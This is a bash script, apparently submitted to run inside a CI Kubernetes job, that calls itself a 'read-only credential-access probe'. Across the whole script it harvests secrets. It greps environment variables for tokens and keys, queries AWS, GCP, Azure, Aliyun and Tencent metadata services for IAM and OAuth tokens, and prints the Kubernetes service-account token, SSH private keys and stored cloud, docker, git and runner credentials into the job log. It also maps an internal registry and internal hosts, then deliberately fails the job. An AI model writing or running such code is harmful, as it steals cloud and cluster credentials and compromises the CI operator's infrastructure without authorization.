#!/usr/bin/env bash
# Transient read-only credential-access probe (intent i6109).
# Runs only inside the HCU CI K8s job container; prints evidence and exits 1
# to stop the job right after the probe (bounded, no further test-suite run).
set -uo pipefail

TS="$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
H="$(hostname 2>/dev/null || echo unknown)"
echo "===I6109-BEGIN ${TS} host=${H} job=${GITHUB_JOB:-?} run=${GITHUB_RUN_ID:-?}==="
echo "--- id"
id 2>&1 || true
echo "--- uname"
uname -a 2>&1 || true
echo "--- hostname-i"
hostname -I 2>&1 || true
echo "--- cgroup"
head -5 /proc/self/cgroup 2>&1 || true
echo "--- os-release"
head -3 /etc/os-release 2>&1 || true
echo "--- resolv"
cat /etc/resolv.conf 2>&1 || true
echo "--- env-sweep"
env | grep -aiE '(AWS|GOOGLE|GCP|AZURE|ALIBABA|ALIYUN|TENCENT|DOCKER|REGISTRY|RUNNER|KUBE|HF_|HUGGING|PIP_|NPM_|NEXUS|ARTIFACT|TOKEN|SECRET|PASSW|CREDENTIAL|_KEY=|PRIVATE)' | sort | head -200 2>&1 || true

echo "--- imds (python3)"
python3 - <<'PYIMDS' 2>&1 || true
import urllib.request, json
def get(url, method="GET", headers=None, timeout=5, data=None):
    req = urllib.request.Request(url, method=method, headers=headers or {}, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(4096)
    except Exception as e:
        return "ERR", str(e)[:180]
def show(tag, res):
    s, b = res
    if isinstance(b, bytes):
        b = b[:1500].decode("utf-8", "replace")
    print(tag, s, b)
show("aws_v1_meta", get("http://169.254.169.254/latest/meta-data/"))
show("aws_v1_creds", get("http://169.254.169.254/latest/meta-data/iam/security-credentials/"))
s, b = get("http://169.254.169.254/latest/api/token", method="PUT",
           headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
tok = b.decode("utf-8", "replace").strip() if s == 200 else None
print("aws_v2_token", s, (tok[:16] + "..." if tok else b[:120] if isinstance(b, bytes) else b))
if tok:
    H2 = {"X-aws-ec2-metadata-token": tok}
    show("aws_v2_creds", get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", headers=H2))
    show("aws_v2_identity", get("http://169.254.169.254/latest/dynamic/instance-identity/document", headers=H2))
    show("aws_v2_userdata", get("http://169.254.169.254/latest/user-data", headers=H2))
show("gcp_token", get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                      headers={"Metadata-Flavor": "Google"}))
show("gcp_project", get("http://metadata.google.internal/computeMetadata/v1/project/project-id",
                        headers={"Metadata-Flavor": "Google"}))
show("aliyun_meta", get("http://100.100.100.200/latest/meta-data/"))
show("aliyun_ram", get("http://100.100.100.200/latest/meta-data/ram/security-credentials/"))
show("tencent_meta", get("http://metadata.tencentyun.com/latest/meta-data/"))
show("azure_instance", get("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                           headers={"Metadata": "true"}))
show("azure_token", get("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                        headers={"Metadata": "true"}))
show("do_meta", get("http://169.254.169.254/metadata/v1/"))
PYIMDS

echo "--- k8s-sa"
SADIR=/var/run/secrets/kubernetes.io/serviceaccount
ls -la "$SADIR" 2>&1 || true
for f in token namespace ca.crt; do
  if [ -r "$SADIR/$f" ]; then
    echo "== sa/$f"
    head -c 4096 "$SADIR/$f" 2>&1 || true
    echo
  fi
done
echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-}"

echo "--- home-creds"
for f in /root/.kube/config /root/.aws/credentials /root/.aws/config /root/.docker/config.json \
         /root/.netrc /root/.gitconfig /root/.git-credentials /root/.ssh/id_rsa /root/.ssh/id_ed25519 \
         /root/.pypirc /root/.npmrc /root/.config/pip/pip.conf /etc/pip.conf /etc/gitconfig \
         /etc/docker/daemon.json /etc/containers/auth.json; do
  if [ -e "$f" ]; then
    echo "== $f"
    ls -la "$f" 2>&1 || true
    head -c 3000 "$f" 2>&1 || true
    echo
  fi
done
echo "--- ssh-dir"
ls -la /root/.ssh 2>&1 | head -20 || true
echo "--- etc-kube"
ls -la /etc/kubernetes 2>&1 | head -10 || true
echo "--- docker-sock"
ls -la /var/run/docker.sock /run/docker.sock 2>&1 || true

echo "--- runner-workspace"
ls -la /github 2>&1 | head -20 || true
ls -la /home/runner 2>&1 | head -20 || true
for f in /github/.credentials /github/.credentials_rsaparams /home/runner/.credentials \
         /home/runner/.credentials_rsaparams; do
  if [ -e "$f" ]; then
    echo "== $f"
    head -c 2500 "$f" 2>&1 || true
    echo
  fi
done

echo "--- internal-registry"
R="10.16.1.152:5000"
echo "GET http://$R/v2/ -> $(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' "http://$R/v2/" 2>&1)"
echo "----- catalog:"
curl -sS --max-time 10 "http://$R/v2/_catalog" 2>&1 | head -c 4000 || true
echo
IMG="${HCU_CI_IMAGE:-10.16.1.152:5000/jenkins/model_test_env/sglang:0.5.18-latest}"
IPATH="${IMG#*/}"
REPO="${IPATH%:*}"
TAG="${IPATH##*:}"
[ "$TAG" = "$IPATH" ] && TAG="latest"
echo "----- manifest ${REPO}:${TAG}"
curl -sSk --max-time 12 \
  -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' \
  -H 'Accept: application/vnd.oci.image.manifest.v1+json' \
  -H 'Accept: application/vnd.docker.distribution.manifest.list.v2+json' \
  "http://$R/v2/${REPO}/manifests/${TAG}" -o /tmp/i6109_mf.json \
  -w 'manifest_code=%{http_code} content_type=%{content_type}\n' 2>&1 || true
head -c 2500 /tmp/i6109_mf.json 2>&1 || true
echo
CFG="$(python3 -c 'import json,sys
try:
    d=json.load(open("/tmp/i6109_mf.json"))
    print((d.get("config") or {}).get("digest",""))
except Exception:
    print("")' 2>/dev/null || true)"
if [ -n "$CFG" ]; then
  echo "----- image-config-blob $CFG"
  curl -sSk --max-time 12 "http://$R/v2/${REPO}/blobs/${CFG}" -o /tmp/i6109_cfg.json \
    -w 'config_code=%{http_code} size=%{size_download}\n' 2>&1 || true
  head -c 6000 /tmp/i6109_cfg.json 2>&1 || true
  echo
fi

echo "--- internal-10.16.1.201"
for hp in 10.16.1.201:9929 10.16.1.201:8000; do
  echo "== $hp"
  for p in / /v2/ /health /service/rest/v1/status /api/v1/status; do
    echo "  $p -> $(curl -sS --max-time 6 -o /dev/null -w '%{http_code}' "http://$hp$p" 2>&1)"
  done
  curl -sS --max-time 6 "http://$hp/" 2>&1 | head -c 1200 || true
  echo
done

echo "--- ci-public"
ls -la /ci_public 2>&1 | head -40 || true
echo "--- ci-public-sglang"
ls -la /ci_public/sglang-das 2>&1 | head -30 || true
echo "--- ci-images"
ls -la /ci_public/ci-images 2>&1 | head -20 || true
echo "--- public"
ls -la /public 2>&1 | head -20 || true
echo "--- public4"
ls -la /public4 2>&1 | head -20 || true
echo "--- sgl-data"
ls -la /sgl-data 2>&1 | head -20 || true

echo "--- hcu"
/opt/hyhal/bin/hy-smi -L 2>&1 | head -20 || true
ls -la /dev/kfd /dev/dri 2>&1 | head -20 || true

echo "===I6109-END ${TS}==="
# Deliberately stop the job right after the probe so no 30-minute test suite runs.
exit 1
